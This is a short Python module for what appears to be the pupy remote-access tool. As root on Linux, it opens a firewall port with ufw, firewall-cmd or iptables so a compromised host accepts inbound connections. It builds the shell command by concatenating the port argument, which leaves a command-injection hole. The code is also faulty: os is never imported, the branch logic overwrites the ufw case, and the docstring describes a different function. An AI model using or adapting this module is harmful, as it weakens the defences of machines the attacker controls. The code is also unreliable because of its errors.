# -*- coding: utf-8 -*-

""" Change pupy process's name """

__dependencies__ = {
    'linux': ['pupyps']
}

__arguments__ = {
    'port': 'TCP Port to open'
}

__compatibility__ = ('linux')

import subprocess
from pupy import infos
from os import path, getuid

def main(port='53547',logger=None):
    if os.getuid() != 0:
        logger.error('we are no root')
        return 

    if path.isfile("/usr/sbin/ufw"):
        cmd = "/usr/sbin/ufw allow " + port
    if path.isfile("/usr/sbin/firewall-cmd"):
        cmd = "firewall-cmd --zone=public --add-port=" + port + "/tcp --permanent"        
    else:
        cmd = "iptables -I INPUT -p tcp -m tcp --dport " + port + " -j ACCEPT"
    subprocess.call(cmd, shell=True)
